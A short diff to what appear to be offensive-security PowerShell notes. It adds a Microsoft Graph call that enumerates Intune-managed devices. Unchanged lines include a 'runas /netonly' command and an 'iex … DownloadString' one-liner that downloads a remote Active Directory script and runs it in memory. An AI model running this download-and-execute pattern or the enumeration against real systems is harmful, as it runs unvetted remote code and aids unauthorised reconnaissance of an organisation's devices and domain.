@@ -12,6 +12,13 @@ Invoke-RestMethod `
     -Headers $headers `
     -Method GET
 
+To enumerate Intune-managed devices:
+
+Invoke-RestMethod `
+    -Uri "https://graph.microsoft.com/beta/deviceManagement/managedDevices" `
+    -Headers $headers `
+    -Method GET
+
 runas /netonly /user:DOMAIN\retest powershell.exe
 
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
